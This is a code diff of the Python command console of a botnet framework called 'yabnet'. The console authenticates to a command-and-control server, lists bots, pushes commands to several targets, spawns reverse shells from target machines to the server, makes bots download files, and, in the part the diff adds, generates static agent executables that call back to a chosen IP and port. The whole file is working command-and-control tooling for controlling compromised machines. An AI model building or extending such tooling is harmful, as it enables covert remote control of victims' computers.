@@ -8,18 +8,16 @@ import asyncio
 import threading 
 import json
 import pathlib 
-from multiprocessing.pool import ThreadPool
 import time
 from subprocess import Popen, PIPE
+from multiprocessing.pool import ThreadPool
 
 import cmd2
 from cmd2 import ansi
 
-#MASTERKEY = "masterkey"
-TIMER = '12'
+import generator
 
-#URL = 'http://localhost:5000'
-# What if there is a thread in master which runs and hits server's refresh endpoint every 10 seconds 
+TIMER = '12'
 
 def refresh():
     while True:
@@ -94,7 +92,10 @@ ___  ___          _              _____                       _
 
             return IP 
 
-    # Start of login command, which will authenticate master to the server
+    """
+    Command: login 
+    Description: Authenticate with the yabnet server and retrieve the masterkey after authentication
+    """
     login_parser = argparse.ArgumentParser()
     login_parser.add_argument('-r', '--remote', type=str, help='Remote rabnet server host to login to. <ip>:<port>')
     login_parser.add_argument('-u', '--username', type=str, help='Username to login with')
@@ -103,9 +104,6 @@ ___  ___          _              _____                       _
     @cmd2.with_category(CUSTOM_CATEGORY)
     @cmd2.with_argparser(login_parser)
     def do_login(self, args):
-        """
-        TODO: Implement User Model and /login endpoint in the server 
-        """
         remoteserver = args.remote 
         username = args.username 
         password = args.password 
@@ -125,27 +123,34 @@ ___  ___          _              _____                       _
         self.poutput(output_username)
         self.poutput(output_password)
 
+        # Send authentication request to /auth endpoint 
         data = {'username': username, 'password': password}
         res = requests.post(auth_url, data)
         response_data = res.json()
 
+        # Authentication successful 
         if response_data['result'] == 'SUCCESS':
             global MASTERKEY
             MASTERKEY = response_data['masterkey']
             output_success = ansi.style('[+] Successfully logged in.', fg='green', bold=True)
             self.poutput(output_success)
             
-            # Upon succerssful login, begin the refresh thread to automatically refresh botlist in server. 
+            # Begin the refresh thread to automatically refresh botlist in server. 
             refreshing = threading.Thread(target=refresh)
             refreshing.daemon = True
             refreshing.start()
+
+        # Authentication failed 
         else:
             output_failed_server = ansi.style(res.text, fg='red', bold=True)
             output_failed = ansi.style('[-] Authentication have failed.', fg='red', bold=True)
             self.poutput(output_failed_server)
             self.poutput(output_failed)
 
-    # TODO: Implement the find/filter flag 
+    """
+    Command: list 
+    Description: Retireve list of bots from the server and display it to master 
+    """
     list_parser = argparse.ArgumentParser()
     list_parser.add_argument('-f', '--find', type=str, help='Find specific agent by ip address')
     # TBH the result from the server should be in json format, and this CLI should parse the JSON and pretty print. 
@@ -156,7 +161,7 @@ ___  ___          _              _____                       _
             if URL is None:
                 self.poutput('URL is not set!')
         except Exception as e:
-            output_loginfirst = ansi.style("\n\n!!! Login First !!!\n", fg='red', bg='blue', bold=True)
+            output_loginfirst = ansi.style("\n\n<Login is Required>\n", fg='red', bg='blue', bold=True)
             self.poutput(output_loginfirst)
 
 
@@ -172,14 +177,11 @@ ___  ___          _              _____                       _
         self.poutput(output_botlist)
 
 
-
     """
     Command: Commands 
     Description: Show all the commands that have been issued. 
-    (TODO: Fix this, and make sure to add a filter to per IP address)
     """
     @cmd2.with_category(CUSTOM_CATEGORY)
-    #@cmd2.with_argparser()
     def do_commands(self, arg):
         try:
             if URL is None:
@@ -212,8 +214,8 @@ ___  ___          _              _____                       _
     @cmd2.with_argparser(push_parser)
     def do_push(self, args):
         target_list = args.target.split(",")
-        #print("[DEBUG] target_list = ", target_list)
 
+        # Push the command to multiple targets 
         for target in target_list:
             url = URL + '/bot/' + target + '/push'
             masterkey = MASTERKEY
@@ -235,7 +237,7 @@ ___  ___          _              _____                       _
 
     """
     Command: reverse 
-    Description: Spawn an interactive shell between the target machine and the server. 
+    Description: Spawn an interactive reverse shell from the target machine to the server. 
     """
     shell_parser = argparse.ArgumentParser()
     shell_parser.add_argument('-t', '--target', type=str, help="Target bot's IP address")
@@ -269,15 +271,15 @@ ___  ___          _              _____                       _
     @cmd2.with_category(CUSTOM_CATEGORY)
     @cmd2.with_argparser(download_parser)
     def do_download(self, args):
-        # Error checking - Does the file exist?
+        # Error checking
         my_file = pathlib.Path('../server/uploads/'+args.file)
         if my_file.exists() is False:
             output_error = ansi.style("[-] The file does not exist in <root>/server/uploads/ !", fg='red', bold=True)
             self.poutput(output_error)
-            # TODO: Stop this command - I need to read the docs for this 
 
         target_list = args.target.split(",")
 
+        # Order the bots to download file from the server 
         for target in target_list:
             url = URL + '/bot/' + target + '/push'
             masterkey = MASTERKEY
@@ -313,10 +315,14 @@ ___  ___          _              _____                       _
         
         if 'result' in response_data:
             self.poutput(ansi.style(response_data['result'], fg='green', bold=True))
-        #self.poutput(data['result'])
 
 
-    # TODO: Implement file upload 
+    """
+    Command: upload 
+    Description: Upload file from master to the server 
+
+    TODO: Implement this command 
+    """
     upload_parser = argparse.ArgumentParser()
     upload_parser.add_argument('-f', '--file', type=str, help='Directory path and filename to be uploaded to the server')
     @cmd2.with_category(CUSTOM_CATEGORY)
@@ -325,6 +331,30 @@ ___  ___          _              _____                       _
         url = URL + '/uploads'
 
         pass 
+
+    """
+    Command: generate 
+    Description: Generate a static agent executable from the golang file 
+
+    TODO: Implement this command 
+    """
+    generate_parser = argparse.ArgumentParser()
+    generate_parser.add_argument('-i','--ip',type=str, help='IP address of yabnet server the agent calls back to', required=True)
+    generate_parser.add_argument('-p','--port',type=str, help='Port number of yabnet server the agent calls back to', required=True)
+    generate_parser.add_argument('-f','--freeze', action="store_true", help='Freeze the agent to a fully static executable')
+    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_argparser(generate_parser)
+    def do_generate(self, args):
+        self.poutput(ansi.style('[+] Freezing agent file...', fg='green', bold=True))
+
+        ip = args.ip
+        port = args.port 
+        freeze = args.freeze 
+        #print(freeze)
+
+        generator.generateNfreeze(ip, port, freeze)
+
+        self.poutput(ansi.style('[+] Generate command executed successfully.', fg='green', bold=True))
 
     @cmd2.with_category(CUSTOM_CATEGORY)
     def do_exit(self, arg):
